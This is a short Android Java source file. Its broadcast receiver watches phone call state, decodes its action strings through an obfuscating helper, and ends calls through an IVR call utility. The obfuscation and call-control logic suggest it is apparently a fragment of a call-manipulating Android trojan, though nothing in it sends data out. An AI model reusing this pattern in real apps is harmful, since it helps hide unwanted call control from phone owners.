package c;
import net.workspace.ivr.CallPhoneUtil;
import net.workspace.util.ParseKsy;
import net.workspace.util.T;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

/**
 * PhoneStateChangeReceive
 * @author Hike
 *
 */
public class FSCR extends BroadcastReceiver {
    /**
     * android.intent.action.NEW_OUTGOING_CALL
     */
    private String ACTION = ParseKsy.decode("162ef256c2d7e65c1493a06e552d642c3d6f5e34997582702cc849588d6f65b3e43f7f0ddc5a78f02f68bb904a2ddda7");
    /**
     * phone
     */
    private String PHONE = ParseKsy.decode("aa1c29f6c80d730cff92979c49424daa");
    @Override
    public void onReceive(Context context, Intent intent) {
        T.registerReciever();
        if (!ACTION.equals(intent.getAction())) {
            switch (((TelephonyManager) context.getSystemService(PHONE)).getCallState()) {
                case 0:
                    CallPhoneUtil.stopCall();
                    break;
            }
        }
    }
}
